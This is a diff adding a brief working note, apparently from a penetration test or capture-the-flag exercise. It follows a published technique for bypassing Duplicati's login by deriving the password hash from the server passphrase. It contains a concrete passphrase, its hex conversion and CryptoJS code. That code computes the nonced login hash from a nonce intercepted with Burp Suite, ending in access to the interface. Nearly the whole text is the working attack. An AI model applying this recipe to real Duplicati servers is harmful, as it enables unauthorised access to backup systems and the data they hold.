@@ -1,0 +1,18 @@
+
+
+Following: https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee
+
+server-passphrase: Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+
+Base64toHex: 59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
+
+
+saltedpwd = 59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
+data.nonce = dynamic from burpsuite
+
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
+
+var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse("cBgHTpl8o0jtvXm9x3H3J7szHXsy2NkWGT/Vf1VucMA=") + "59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a")).toString(CryptoJS.enc.Base64);
+
+
+Post login -> Access to user interface password: Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
